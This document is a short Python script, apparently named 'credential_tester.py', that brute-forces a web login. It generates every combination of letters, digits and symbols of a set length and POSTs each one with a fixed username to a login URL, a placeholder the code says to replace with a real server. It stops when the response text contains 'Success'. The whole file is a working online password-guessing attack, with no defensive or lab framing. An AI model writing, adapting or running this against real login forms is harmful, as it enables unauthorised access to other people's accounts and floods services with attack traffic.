# PPC
credential_tester.py


import itertools
import string
import requests

# Generate all possible combinations of symbols, digits, uppercase and lowercase letters
def generate_combinations(length):
    characters = string.ascii_letters + string.digits + string.punctuation  # Letters, digits, symbols
    return itertools.product(characters, repeat=length)

# Function to send a request
def try_password(username, password):
    url = "http://example.com/login"  # Replace with the server address
    data = {
        "username": username,  # Field for the username
        "password": password   # Field for the password
    }
    
    try:
        # Example POST request
        response = requests.post(url, data=data)
        
        # Logging current password attempt and response
        print(f"Attempt: {username} | {password}, Response: {response.status_code}")
        
        # Check for success (depends on the specific server response)
        if "Success" in response.text:  # Change to the appropriate success condition
            print(f"Password found for user {username}: {password}")
            return True
    except Exception as e:
        print(f"Error sending request: {e}")
    
    return False

# Iterating through all possible combinations
def brute_force_password(username, length):
    for combination in generate_combinations(length):
        password = ''.join(combination)
        
        # Sending the current password
        if try_password(username, password):
            break

# Starting the password brute force for the user "myusername" with length 4
brute_force_password("myusername", 4)
